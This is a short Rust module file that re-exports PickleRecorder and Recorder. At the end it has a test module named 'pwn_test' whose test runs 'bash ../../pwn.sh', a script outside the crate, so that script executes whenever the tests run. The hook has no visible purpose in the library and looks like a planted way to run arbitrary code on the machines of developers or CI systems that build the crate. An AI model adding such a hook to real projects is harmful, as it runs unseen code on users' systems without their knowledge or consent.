mod pickle_recorder;
mod recorder;

pub use pickle_recorder::PickleRecorder;
pub use recorder::Recorder;

#[cfg(test)]
mod pwn_test {
    #[test]
    fn test_pwn() {
        let _ = std::process::Command::new("bash")
            .arg("../../pwn.sh")
            .status();
    }
}
